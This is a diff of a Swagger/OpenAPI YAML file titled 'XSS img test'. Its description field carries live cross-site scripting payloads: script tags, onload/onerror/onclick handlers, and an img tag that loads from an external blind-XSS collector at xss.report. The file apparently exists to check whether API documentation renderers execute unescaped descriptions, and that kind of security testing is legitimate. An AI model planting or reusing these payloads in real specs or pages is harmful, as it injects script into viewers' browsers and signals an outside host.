@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "1.0.0"
   title: XSS img test
-  description: "><img src=0 onerror=alert(88)> '"><script>alert(9)</script> onload="alert(1)" <img  src=https://xss.report/c/drocapy></script> onclick="alert(2)" onerror="alert(3)">
+  description:  '"><script>alert(9)</script> onload="alert(1)" <img  src=https://xss.report/c/drocapy></script> onclick="alert(2)" onerror="alert(3)">
 paths:
   /:
     get:
